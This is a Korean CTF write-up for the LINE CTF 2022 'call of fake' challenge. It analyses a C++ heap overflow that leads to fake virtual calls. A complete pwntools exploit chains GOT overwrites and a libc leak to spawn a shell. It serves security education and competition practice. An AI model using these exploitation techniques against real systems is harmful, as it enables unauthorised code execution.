---
layout: post
title: LINE CTF 2022 - call of fake
date: 2022-04-17 13:55:00 +0900
categories: [Security, CTF]
tags: [c++, pwnable, BOF, virtual function, security factorial]
media_subpath: /assets/img/
---

![rank](0417-LINE-calloffake-writeup/01-rank.png)

3월 26일에 있었던 LINE CTF에 Security Factorial의 이름으로 참가하였고 18등을 하였다!

나는 call-of-fake 한 문제를 SDJ 형이랑 같이 풀었다.

---

## 문제 분석

![생각보다 잔디가 없다](0417-LINE-calloffake-writeup/02-checksec.png)

이 문제는 C++로 짜였고, C++ 하면 객체지향이다.

그런데, 이 문제에서 쓰이는 클래스들을 모두 분석하기에는 그 양이 방대해서, 동적 분석을 진행하고 필요한 것만 가져다가 IDA에 반영하는 식으로 우회 조건을 파악하면서 문제를 해결하였다.

먼저, main 함수는 decompile 된 코드를 보면, 좀 어지러울 수 있지만, 코드 구성은 대충 다음과 같다.

```c
objectManager *om;
guardManager *gm;

int main()
{
	char read_buf[64];
	char buf[0x400];

	setvbuf(stdin, 0, 2, 0);
	setvbuf(stdout, 0, 2, 0);
	memset(read_buf, 0, sizeof(read_buf));
	memset(buf, 0, sizeof(buf));

	om = new objectManager();
	gm = om->castGuardManager();
	puts("Make call of fake!");

	for(int i=0; i<9; ++i)
		om->Objects[i] = new Object1(gm);

	for(int i=0; i<9; ++i)
	{
		Object1 *ptr = om->Objects[i];
		ptr->setTag(i);

		printf("str: ");
		memset(read_buf, 0, sizeof(read_buf));
		read(0, read_buf, 0x20);

		ptr->setName(read_buf, strlen(read_buf));
		puts(ptr->getNameBuffer());
	}

	printf("heap buffer overflow primitive: ");
	read(0, buf, 0x400);
	memcpy(om->myObject[0], buf, 0x400);  // <--- vulnerable
	delete om;
	return 0;
}
```
`objectManager` 객체에서는 9개의 Object1 객체를 멤버 변수로 가지고 있다. 그리고, 9개의 객체 내부의 `objectString` 멤버에 원하는 값을 쓴다. 그리고, 가장 중요한 것은 `om->myObject[0]`에 0x400만큼 힙 오버플로우가 발생한다는 것이다. 그리고, `om`의 destructor가 실행될 때, 우리가 힙에 작성한 값이 문제가 된다.

프로그램을 실행하고, 힙 오버플로우를 낼 때, 'A'를 쭉 입력하면 다음과 같은 디버깅 화면을 볼 수 있다.

![pwndbg - segmentation fault](0417-LINE-calloffake-writeup/03-segmentation-fault.png)

이를 통해, `objectManager`의 destructor 메소드가 실행되는 과정에서, 우리가 `objects[0]`에 입력한 값을 역참조한다는 것을 확인할 수 있다. 그렇다면, 'A'*8이 아니라, 무언가 정상적으로 역참조할 수 있는 값을 주어야 할 것이다.

그렇다면, 어떤 주소를 입력하는 것이 좋을까? decompile 된 코드를 살펴보자.

![objectManager::~objectManager / line 37](0417-LINE-calloffake-writeup/07-decompiled.png)

`om->Objects[i]->object1_vtable`의 값(우리가 통제할 수 있는 부분)을 가져온다.

그리고, 그것이 0이거나, `*(funcs+8*k)`와 일치하지 않으면, `exit(0)`을 수행하고,

그렇지 않으면, 자기 자신을 인자로 해당 함수를 실행한다.

<span style="color: #808080">* func_fire라고 표시된 거는 원래 들어있는 값이 Object1::fire() 여서 그렇다..</span>

그렇다면, funcs 테이블에 위치한 값은 무엇이길래 저걸 참조할까?

![b* 0x402D26 / ... / tele $rax 12](0417-LINE-calloffake-writeup/04-breakpoint.png)

바로, 가상함수 모음집이다. Object1의 메소드도 있고, objectString의 메소드도 있고, objectManager의 메소드도 있다.

이걸 어디서 났느냐?

![objectManager::objectManager -> guardManager::guardManager -> Guard::loadObjectFlow](0417-LINE-calloffake-writeup/05-function-table.png)

`objectManager`의 생성자에서 실행되는 함수 중에, `guardManager`의 벡터에 위의 함수들을 push_back하는 루틴이 존재한다! 즉, 힙에 있는 값이므로, overwrite가 가능하고 이를 이용하면 원하는 함수를 실행시킬 수도 있을 것이다.

그러나, `objectManager`의 생성자가 실행되고, 소멸자가 호출되는 사이에 힙에 있는 값을 overwrite하는 것은 어렵다. 따라서, 위에 있는 함수들을 적절히 이용하여, libc leak을 수행하고 쉘을 따내야 한다는 의미가 된다.

이중에서 내가 유용하게 사용하였던 함수는 `Object1::addTwiceTag와 objectString::set`이다.

`Object1::addTwiceTag`는 `Object1::addTag(this, *((_QWORD *)this + 1))`을 수행하는 함수로, `om->objects` 객체를 p64(addTwiceTag) + p64(rsi)로 덮으면, 원하는 값으로 rsi 설정이 가능하다.

`objectString::set`는 `memcpy(*((_QWORD)this+1), a2, *((_QWORD)this +2))`을 수행하는 함수로, `om->objects` 객체를 p64(set) + p64(rdi) + p64(rdx)로 덮으면, 임의의 destination에 원하는 size만큼 덮을 수 있다.

즉, `om->objects[0]`을 `addTwiceTag`로 세팅하고, `om->objects[1]`을 `objectString::set`로 세팅하면, memcpy(rdi, rsi, rdx)를 호출할 수 있다. 또한, call-of-fake 바이너리가 partial relro이기 때문에, GOT Overwrite가 가능하다는 것도 중요하다.

이전에 언급하였듯이, 위 벡터에 존재하지 않는 주소를 덮을 경우, exit(0)을 호출한다고 하였다. 그런데, 우리가 exit의 got를 원하는 주소로 덮어버린다면?

임의 함수 호출이 가능하다는 소리가 되고, 심지어는 그 뒤의 루틴이 `objects[i]->vtable` 함수 호출이기 때문에, 위 벡터에 존재하지 않는 주소라도 역참조하여 실행시킬 수 있다는 의미가 된다.

이러한 정보들을 적절히 활용하면, 문제를 풀이할 수 있다. 이후의 풀이 방법은 사람마다 다양할 것이다.

---

## 익스플로잇

```python
from pwn import *

def sendStr(msg):
    p.sendafter(b"str: ", msg)

p = process('./call-of-fake')
libc = ELF('/usr/lib/x86_64-linux-gnu/libc-2.31.so', False)
for i in range(9):
    sendStr(b'A'*0x20)

om = 0x407110
gm = 0x407118
StringSet = 0x405d68
addTwiceTag = 0x405d50

# memcpy(exit_got, read_got, 0x8)
payload = p64(addTwiceTag)
payload += p64(0x407098) + b'B'*0x30
payload += p64(StringSet)
payload += p64(0x407088) + p64(0x8) + b'B'*0x28

# memcpy(memset_got, puts_got, 0x8)
payload += p64(addTwiceTag)
payload += p64(0x4070a8) + b'B'*0x50
payload += p64(StringSet)
payload += p64(0x407050) + p64(0x8) + b'B'*0x48

# puts(read_got)
payload += p64(addTwiceTag)
payload += p64(0x0) + b'C'*0x50
payload += p64(StringSet)
payload += p64(0x407098) + p64(0x0) + b'D'*0x48

# exit(0, memcpy_got, a3) -> read(0, memcpy_got, a3)
payload += p64(addTwiceTag)
payload += p64(0x407050) + b'F'*0x50
payload += p64(0x407020) + b'E'*0x58

# memcpy(_ZdlPv_got, a2, 0) -> system("/bin/sh")
payload += p64(StringSet)
payload += p64(0x407058) + p64(0)
p.sendafter(b": ", payload)

libc.address = u64(p.recv(6)+b'\x00\x00') - libc.symbols['read']
read = libc.symbols['read']
system = libc.symbols['system']

log.info("libc_base : " + hex(libc.address))
p.send(p64(system) + b'/bin/sh\x00')

p.interactive()
```
나의 문제 풀이 방법은 다음과 같다.

1. exit_got를 read_got로 덮는다.

2. memset_got를 puts_got로 덮는다.

3. puts(read_got)를 호출한다. (이때, addTwiceTag는 필요 없는 것 같은데 넣었네요)

4. Object1::addTwiceTag를 이용해, rsi를 memcpy_got로 세팅하고, 가상함수 테이블에 없는 함수인 printf_got를 넣어서, read(0, memcpy_got, arg3)을 실행한다.

5. memcpy_got를 system 함수로, 바로 옆에 있는 값을 "/bin/sh"로 덮은 뒤에, objectString::set 메소드를 호출하여, system("/bin/sh")가 실행되게 한다.

![shell](0417-LINE-calloffake-writeup/06-shell.png)
